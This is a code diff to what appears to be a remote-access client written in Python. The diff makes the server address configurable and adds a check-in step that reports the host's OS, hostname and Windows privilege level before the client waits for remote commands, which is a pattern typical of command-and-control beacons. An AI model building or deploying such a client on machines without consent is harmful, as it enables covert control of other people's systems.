@@ -1,17 +1,21 @@
 import inspect
+import json
 import os
+import platform
+import socket
 import sys
 import time
 
 from entity.server import Server
+from util import win32util
 from util.command import Command
 from util.parser import parse
 
 
 class Client:
-    def __init__(self):
+    def __init__(self, address):
         # 服务端地址
-        self.address = ('127.0.0.1', 9999)
+        self.address = address
         # 服务端套接字
         self.server = Server()
 
@@ -20,6 +24,16 @@ class Client:
         # 连接失败等待5秒后重新连接
         while not self.server.connect(self.address):
             time.sleep(5)
+        # 发送验证信息
+        info = {
+            # 操作系统
+            'os': platform.platform(),
+            # 主机名
+            'hostname': socket.gethostname(),
+            # 权限
+            'integrity': win32util.get_integrity() if os.name == 'nt' else 'N/A'
+        }
+        self.server.send_result(1, json.dumps(info))
 
     # 等待命令
     def wait(self):
